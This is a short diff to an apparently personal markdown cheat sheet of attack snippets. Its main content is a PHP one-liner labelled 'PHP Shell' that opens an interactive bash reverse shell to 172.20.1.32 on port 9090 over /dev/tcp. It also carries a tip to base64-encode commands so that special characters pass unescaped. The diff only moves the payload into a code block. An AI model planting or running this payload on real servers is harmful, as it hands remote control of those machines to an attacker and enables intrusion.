@@ -15,4 +15,6 @@ author: redle
 > Use base64 to send the command, this avoid problem with special chas as : ',",;, and eliminate the scape of these chars.
 
 ## PHP Shell:
-> <?php system(\"/bin/bash -c 'bash -i >& /dev/tcp/172.20.1.32/9090 0>&1'\");?>
+```
+<?php system(\"/bin/bash -c 'bash -i >& /dev/tcp/172.20.1.32/9090 0>&1'\");?>
+```
